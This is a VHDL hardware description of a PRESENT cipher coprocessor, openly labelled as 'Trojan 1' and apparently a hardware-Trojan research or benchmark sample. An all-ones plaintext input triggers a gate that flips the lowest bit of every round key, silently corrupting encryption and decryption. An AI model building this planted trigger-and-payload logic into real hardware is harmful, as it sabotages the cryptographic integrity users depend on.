library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;

-- Trojan 1: trigger = specific plaintext input
-- payload = flip the LSBit of the round key retrieved from memory at each CRYPTO_OP cycle

entity present_Trojan1 is
        port (
                clk             : in std_logic;
                rst             : in std_logic;
                ena             : in std_logic;

                mode_sel        : in std_logic_vector(1 downto 0);
                key             : in std_logic_vector(127 downto 0);
                data_in         : in std_logic_vector(63 downto 0);
                data_out        : out std_logic_vector(63 downto 0);
                ready           : out std_logic
        );
end entity present_Trojan1;

architecture rtl of present_Trojan1 is
        signal  key_sched_out,
                key_mem_out : std_logic_vector(63 downto 0);

        signal  current_round,
                mem_address : std_logic_vector(4 downto 0);

        signal  enc_ena,
                dec_ena : std_logic;

        signal  mem_wr_ena : std_logic;

        signal  ciphertext,
                plaintext,
                mux_out : std_logic_vector(63 downto 0);

        signal  key_sched_ena,
                out_ena,
                load_ena : std_logic;

        signal  trojan_trig : std_logic;

        signal  trojan_round_key : std_logic_vector(63 downto 0);
begin
        -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
        -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       

        -- trojan_trig <= '1' when data_in = x"1234ABBA5678DEED" else '0';
        trojan_trig <= '1' when data_in = x"FFFFFFFFFFFFFFFF" else '0';

        control_unit : entity work.present_control_unit
                port map(
                        -- inputs
                        clk    => clk,
                        rst    => rst,
                        ena    => ena,
                        op_sel => mode_sel(0),

                        round_counter_val => current_round,
                        mem_addr          => mem_address,
                        mem_wr_ena        => mem_wr_ena,

                        enc_ena  => enc_ena,
                        dec_ena  => dec_ena,
                        load_ena => load_ena,

                        key_sched_ena => key_sched_ena,
                        out_ena       => out_ena,
                        ready         => ready
                );

        key_sched : entity work.key_schedule_top
                port map(
                        clk               => clk,
                        rst               => rst,
                        ena               => key_sched_ena,
                        mode              => mode_sel(1),
                        input_key         => key,
                        output_key        => key_sched_out,
                        round_counter_val => current_round
                );

        round_key_mem : entity work.key_mem
                port map(
                        clk      => clk,
                        addr     => mem_address,
                        data_in  => key_sched_out,
                        wr_ena   => mem_wr_ena,
                        data_out => key_mem_out
                );

        trojan_xor : entity work.xor_2
                port map(
                        a => trojan_trig,
                        b => key_mem_out(0),
                        y => trojan_round_key(0)
                );

        trojan_round_key(63 downto 1) <= key_mem_out(63 downto 1);

        enc_dp : entity work.present_enc
                port map(
                        clk       => clk,
                        rst       => rst,
                        ena       => enc_ena,
                        load_ena  => load_ena,
                        plaintext => data_in,
                        round_key => trojan_round_key,
                        -- round_key  => key_mem_out,
                        ciphertext => ciphertext
                );

        dec_dp : entity work.present_dec
                port map(
                        clk        => clk,
                        rst        => rst,
                        ena        => dec_ena,
                        load_ena   => load_ena,
                        ciphertext => data_in,
                        round_key  => trojan_round_key,
                        -- round_key  => key_mem_out,
                        plaintext => plaintext
                );

        -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
        -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
        -- the output register's input.
        out_mux : entity work.mux
                generic map(
                        DATA_WIDTH => 64
                )
                port map(
                        input_A => ciphertext,
                        input_B => plaintext,
                        sel     => dec_ena,
                        mux_out => mux_out
                );

        -- Coprocessor-global output register, in order to preserve the computed output data,
        -- until new ones are available. This can be helpful when a device reading from
        -- the coprocessor's output, reads with a rate less than the data output rate.
        out_reg : entity work.reg
                generic map(
                        DATA_WIDTH => 64
                )
                port map(
                        clk  => clk,
                        ena  => out_ena,
                        rst  => rst,
                        din  => mux_out,
                        dout => data_out
                );
end architecture;